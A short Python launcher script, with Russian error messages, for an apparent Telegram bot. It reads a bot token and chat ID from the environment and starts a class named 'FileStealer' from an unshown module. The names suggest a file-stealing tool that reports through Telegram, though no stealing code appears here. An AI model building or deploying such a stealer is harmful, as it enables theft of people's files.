import os

from dotenv import load_dotenv

from bot.stealer_bot import FileStealer

load_dotenv()


def main():
    token = os.getenv('TOKEN_TELEGRAM')

    if not token:
        raise ValueError('Отсутствует токен в переменных окружения')

    chat_id = os.getenv('CHAT_ID')

    if not chat_id:
        raise ValueError('Отсутствует ID чата в переменных окружения')

    file_stealer = FileStealer(token, chat_id)
    file_stealer.get_messages()


if __name__ == '__main__':
    main()
